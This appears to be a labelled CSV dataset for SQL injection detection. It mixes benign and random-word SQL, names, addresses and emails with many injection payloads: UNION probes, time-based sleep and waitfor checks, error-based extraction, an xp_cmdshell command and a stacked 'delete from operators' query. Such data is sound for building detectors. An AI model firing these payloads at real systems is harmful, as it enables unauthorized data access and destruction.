query,label
"1""   )    )    as etap where 8506  =  8506 union all select null,null,null,null#",1
"select orders.orderid, customers.customername, orders.orderdate from orders inner join customers on orders.customerid = customers.customerid;",0
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ),1
"1,  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )",1
"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",1
enrique,0
select min ( rhyme )  as certain from greatest,0
retiendas,0
"1""   )    )    as jgie where 8017  =  8017 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1
"select if ( 500<1000, 5, 10 ) ;",0
killan@923.fr,0
segura,0
select fairly ( s )  from creature full outer join,0
"1%"" union all select null,null,null,null,null,null,null,null--",1
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1
"1%' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",1
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )",1
select * from sick,0
38348614r,0
select * from possibly where not author = 'form'  and not planned = 'hay',0
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'pcim'  =  'pcim",1
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )",1
matthiew,0
"travesia doctor sanchez, 139, 12?h",0
"-9698  )   as pvhn where 3223  =  3223 or elt  (  6563  =  9210,9210  )  --",1
select avg ( rubber )  from prize  select sum ( court ),0
"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",1
select * from nothing where milk between '1996-07-01' and '1996-07-31',0
10300,0
"select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",1
select bottle ( s )  from needs select too ( s ),0
"1   )    )    union all select null,null,null,null,null,null,null,null#",1
"select * from finish order by cow, sound",0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'fuyl'  =  'fuyl",1
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",1
"1%""   )    )     )   and 1594  =  8757",1
"1""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
select * from entire where not quiet = 'stone'  and not airplane = 'automobile',0
ramaprak,0
maijhara,0
select count ( led )  from diagram,0
select * from experiment where height = 'other'  and city = 'red',0
"insert into vote ( flat, trap, card, score, correctly, law )  values  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )",0
equiparable,0
"select count ( them ) , solid from card by author",0
barcones,0
"1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
select * from classroom where apple not like '[fun]%',0
5.38547e+15,0
mortensen@look2fly.nr,0
"select * from threw order by stood, manner",0
"select youngid as id, price as wrapped from simply",0
1'   )    )     )   and 2542  =  7042--,1
"1  )   as qodq where 4945  =  4945 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",1
select abs ( -243.5 ) ;,0
1'  )   as zmvn where 2887  =  2887 union all select null--,1
cutillas,0
"1"" where 4064  =  4064 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1.56766e+14,0
uriz carmona,0
select ten ( s )  from stop union,0
7.67e+15,0
select * from path where price not between 10 and 20,0
select * from doubt where fallen between 'gradually' and 'salmon',0
76518142v,0
select option_value from wp_options where option_name  =  '_houzez_property_status_3140' limit 1,0
ubieta,0
"1%""   )    )    and 6283  =  2068 and    (    (   ""%""  =  """,1
"select given, scale, chainfrom if where ship  is not null",0
"end and    (    (     (  ""%""  =  """,1
doce de novembro 165,0
"1""  )   and 3732  =  3850 and   (  ""edjv""  =  ""edjv",1
select avg ( price ) from compare,0
select * from flag where parallel  between 10 and 20,0
"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
select expression from organized,0
"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",1
1   )    )    as eigk where 2557  =  2557,1
"select wasteid as id, surprise as morning from whole",0
select knowledge from fog union all select column from bowl order by wing,0
correnta,0
select speed ( s )  from former left join,0
cele959n3s0o,0
"select prize, cold, lifefrom tree where throat  is not null",0
46198,0
"-8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793#",1
select * from upward fetch first 50 percent rows onlyselect top 3 * from ask,0
select slight ( s ) from transportation inner join,0
-6298' or 4724  =  4876,1
select fox from first union select breakfast from mouse order by silk,0
select * from other,0
ludolfo,0
select * from person,0
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",1
gregescos,0
"select placeid as id, fix as held from early",0
"select * from mail where human not in  ( 'particles', 'porch', 'colony' )",0
49540097y,0
select * from refused,0
daly@diagnosticoradiologico.jm,0
antypas sardans,0
select top 50 percent * from after,0
1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
-4428  )   or 3038  =  3038,1
select top 50 percent * from diameter select * from real fetch first 50 percent rows onlyselect top 3 * from ready,0
select * from  ( select beginning from gold ),0
4.47673e+15,0
9.63962e+15,0
boothe,0
select * from tribe order by hunt,0
select * from neighborhood fetch first 3 rows only select top 50 percent * from cause,0
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
estiradamente,0
select * from willing fetch first 3 rows only select top 50 percent * from highest,0
1' where 4945  =  4945,1
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )",1
select everybody ( s )  from spell full outer join,0
47319,0
57418420r,0
select * from end where empty not between 'oxygen' and 'everywhere',0
"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'cogk'  =  'cogk",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",1
mccollum,0
50700,0
1  )   where 9683  =  9683,1
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )",1
select count ( top ) from model,0
"select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
from  ( select distinct girl from discuss ),0
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",1
select * from rice where forget = 'shout',0
1'  )   and 4595  =  4595#,1
"select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1
66,0
select * from beginning where fell not like '[recently]%',0
"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",1
delete from coat where won = 'driving',0
1  )   where 8041  =  8041,1
fuente el saz de jarama,0
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
"select count ( seat ) , mental from one by best",0
select top 3 * from pony where getting = 'life' select * from ate,0
waitfor delay '0:0:5',1
select distinct progress from animal,0
cecil.wolcott7@librodeapuntes.sv,0
houstin@maxitienda.zr,0
alfeiza,0
"select * from why where rear not in  ( 'wagon', 'theory', 'battle' )",0
monti,0
"1""  )   where 9962  =  9962 and 4595  =  4595#",1
"-8129'   )    )     )   union all select 4531,4531,4531#",1
select * from fur where habit between 'grown' and 'reason',0
select * from proper where    not built = 'well',0
vilamartn de valdeorras,0
"camino del caliero, 75",0
select count ( cottonid ) from changing,0
getulio,0
28189,0
"1""   )    )    as oxrr where 6141  =  6141 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ),1
from  ( select distinct ancient from band ),0
"1'+  (  select 'ayod' where 7839  =  7839 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
select avg ( seven ) from type,0
select * from younger where could like '%chart%',0
select * from complete where ride not between 'proper' and 'fall',0
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",1
"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
8.45e+15,0
"1"" where 7290  =  7290 union all select null,null,null,null,null,null,null--",1
select avg ( lying ) from be,0
"select * from class where add in  ( 'swimming', 'stairs', 'consider' )",0
select avg ( general )  from one  select sum ( cold ),0
select * from grain fetch first 3 rows only,0
select * from new where cloth = 'daughter'  and city = 'given',0
"c/ relfas 122,",0
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cylu'  =  'cylu",1
ezella,0
select avg ( proud ) from mysterious select sum ( broke ),0
-2983'  )   or 8571  =  8571--,1
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'odsl' like 'odsl,1
select avg ( primitive ) from nobody,0
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",1
select * from simple,0
"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 348623 )  order by meta_id asc",0
carmia,0
cuellar reino,0
1  )   as hvsk where 7902  =  7902,1
"1' where 8083  =  8083 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
from  ( select distinct house from shelf ),0
"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",1
embargad!o,0
select * from mix where    not die = 'ask',0
"-1889%'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",1
"1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select * from diameter where most not in  ( 'forget', 'does', 'know' )",0
select whistle ( s )  from mine full outer join,0
1102,0
select * from went where slow between aware09/01/1996exist and route15/31/1996smaller,0
select degrees ( pi (  ) *2 ) ;,0
1'||  (  select 'ghby' from dual where 4854  =  4854,1
acu7ntiar,0
"purpurania, 79 3?b",0
"select market, ever, control from slope where material  is null",0
48638626c,0
-6616  )   order by 1--,1
select * from reach where definition between '1996-07-01' and '1996-07-31',0
9491,0
cervantes,0
select * from station where stranger = 'afraid' limit 3,0
"(  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )",1
1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',1
"-9944""   )    )    or 8537  =  2039 and    (    (   ""kfzj""  =  ""kfzj",1
from  ( select distinct since from went ),0
"c/ torre, 23",0
select * from operators where id = 1 or 1=1,1
"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",1
brenna,0
select top 3 * from hello,0
"select * from bat where won between ""rush"" and    ""think""",0
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""kldp"" like ""kldp",1
1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
kapp,0
select * from cookies where pack = 'share' limit 3,0
select * from medicine where government not like '[feed]%',0
8.71176e+15,0
select * from  ( select wrapped from green ),0
"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  """,1
select * from dozen  where clearly not like '[frozen]%',0
7106,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
pg_sleep  (  __time__  )  --,1
select * from  ( select girl from improve ),0
select * from handsome where die like '%race%',0
"-6656""  )   union all select 3931#",1
select * from missions where id = 1 or 1=1,1
"-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134",1
"1'||  (  select 'cjwx' from dual where 7637  =  7637 and elt  (  9548  =  3991,3991   )    )   ||'",1
"1""   )    )    as puws where 7006  =  7006",1
orejana,0
"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",1
"1'+  (  select mkbv where 1648  =  1648 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
2354,0
credido poma,0
"select crossid as id, nothing as represent from which",0
select * from but,0
"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",1
select count ( lady ) from least,0
select * from square fetch first 50 percent rows only,0
pente@maxitienda.ms,0
1' rlike   (  select   (  case when   (  1916  =  7874  )   then 1 else 0x28 end   )    )    and 'ughq'  =  'ughq,1
1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,1
bosier@opel-e-flex.bn,0
select * from copy  where year not like '[forget]%',0
-7466 where 5161  =  5161 or 3038  =  3038,1
select * from missions where id in (select mission_id from satellites where status = 'active'),0
plmaces de jadraque,0
1'  )   union all select null--,1
"select nest, think+ ', ' + game+ ' ' + present+ ', ' + gain as minerals  from physical",0
0a0t4d2r,0
select halfway ( s )  from correct,0
select * from earth where duty = 'sign'  and city = 'loose',0
"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",1
"1"" union all select null,null,null,null,null,null--",1
select * from mill,0
trespaderne,0
"select employees.level, count ( orders.additionid )  as circusfrom    ( ordersinner join service on orders.southid  =  employees.stairsid )",0
"1,  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )",1
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",1
antirreglamentaria,0
"iif  (  8354  =  3515,1,1/0  )",1
select   (  case when   (  4624  =  4844  )   then 4624 else 1/  (  select 0  )   end  )  --,1
tolox,0
"1""  )   as ebvt where 5305  =  5305",1
"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""xmrq""  =  ""xmrq",1
select * from onto where equally = 'square'  and  ( guess = 'snake' or break = 'bare' ),0
"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",1
select top 3 * from lift where sound = 'shoulder' select * from fur,0
10332,0
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )",1
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )",1
or   (  exists  ),1
hermida fiordalizzi,0
select * from missions where operator_id = 'ops_admin',0
select * from hunt where ruler not like 'thirty%',0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'  =  '",1
select fort ( s )  from be full outer join,0
-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,1
"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",1
c/ maria zayas de sotomayor 18,0
van_bake,0
select * from somehow  where soldier = fairly,0
"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",1
8.79e+15,0
"1%'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  '%'  =  '",1
belmonte de gracin,0
select notice ( s )  from again select group from however,0
steinar,0
"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",1
"1  )   and elt  (  4249  =  4249,7259  )",1
carretera rubi 106,0
select * from neck fetch first 50 percent rows only,0
select * from cool where ready = 'eye'  or regular = 'alive',0
"calle francisco de leiva, 131,",0
"1 where 6965  =  6965 and elt  (  3933  =  1232,1232  )  --",1
select option_value from wp_options where option_name  =  'wpassetcleanup_global_unload' limit 1,0
select * from himself where dried between '1996-07-01' and '1996-07-31',0
"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",1
"select t.*, tt.* from wp_terms as t inner join wp_term_taxonomy as tt on t.term_id  =  tt.term_id where tt.taxonomy in  ( 'support_cat' )  and t.slug in  ( 'preferred-partners' )",0
select * from sheep  where window not like '[north]%',0
select * from mission_events where id = 1 and 1=1 and id = 1,1
select avg ( week ) from against select sum ( mouse ),0
larixa,0
"select * from machine order by range, eight",0
"calle prat de la riba, 73",0
acachorrar,0
5986,0
select * from sky where being between spell09/01/1996throat and fish15/31/1996unless,0
select * from nothing fetch first 50 percent rows onlyselect top 3 * from club,0
select * from itself where experience not between 'sound' and 'measure',0
12489,0
"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
toledo,0
"-4418"" or 6872  =  6872 and ""gbut""  =  ""gbut",1
select * from missions where id = 1; delete from operators where 1=1,1
select sentence,0
select count ( * )  as beyond,0
select book ( s )  from religious union,0
8352,0
"1'   )    )    as hfra where 6500  =  6500 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
select dayname ( curdate (   )  )  ;,0
"-3090"" or make_set  (  9354  =  9354,7185  )   and ""qowe"" like ""qowe",1
heile,0
quicena,0
"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1
select   (  case when   (  5085  =  4259  )   then 5085 else 5085*  (  select 5085 from mysql.db  )   end  )  #,1
"c/ cangas del narcea, 97, 12?e",0
select avg ( caught ) from clean,0
"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""xmvr""  =  ""xmvr",1
inca,0
regueras de arriba,0
angullo acosta,0
"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """,1
gierasch.casini@goovitae.cu,0
select * from repeat,0
select top 3 * from opportunity,0
"select was as family, visitor as [seen]  from against",0
"select share, spider, plates from easy where making  is null",0
"insert into became  ( dark, complete, essential )  values  ( 'freedom', 'wire', 'produce' )",0
"-2314%'   )    )    union all select 4612,4612--",1
28011073v,0
"-9166""  )   as hlre where 4768  =  4768 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
robin@comerciosdeaspe.info,0
select * from spider order by driver,0
6478,0
"select music, noun, where from she where rather  is null",0
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",1
select * from product  where orange = sudden,0
select * from  ( select minute from excitement ),0
"iif  (  9190  =  5059,1,1/0  )",1
select * from noted fetch first 50 percent rows only,0
bora,0
le8ru41,0
select * from should where rear = 'divide',0
6ait1na89,0
bonfiglio cabanas,0
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )",1
"1' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"select faster,cross,eventually from enter left join orders on accurate.plateid =  job.found order by baby.period",0
"select orders.fireplacerid, employees.captain, employees.seed from ordersright join employees on orders.employeeid  =  employees.forid order by orders.slowid",0
select count ( excellent )  from dropped,0
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
"-3437  )   union all select 7774,7774,7774--",1
select avg ( radio ) from plane select sum ( coach ),0
select * from ground_stations where fuel_pct >= 0 or fuel_pct >= 0,1
"-3758'   )    )    union all select 9460,9460,9460,9460,9460,9460,9460,9460--",1
"1"" and elt  (  4594  =  1040,1040  )",1
"1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,1
select dig ( s )  from raise union all,0
delete from ago where completely = 'upon',0
""" """,1
select *into customersbackup2017 in 'backup.mdb' from customers;,0
select outline from worker union all select start from soap order by dot,0
"insert into pick ( tip, could, specific, far, explore, seat )  values  ( 'complete', 'nine'. therefore', 'careful', 'consonant', 'grown', 'become' )",0
"update brought set again =  'center', city =  'father' where tongue =  grown",0
select * from require where headed = 'gravity'  or writing = 'game',0
"-9526 where 5734  =  5734 or elt  (  1032  =  1032,3623  )  --",1
catchot bacard,0
-9389'  )   order by 1#,1
"1' and elt  (  4249  =  4249,7259  )   and 'awjd'  =  'awjd",1
"1   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6265  =  6265",1
6.71861e+15,0
select * from to where rise in  ( select difficulty from willing ),0
-2817  )   where 1212  =  1212 or 3266  =  1102,1
select worried ( s )  from essential left join,0
18684547z,0
select army ( s )  from coach left join,0
1 where 2649  =  2649 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
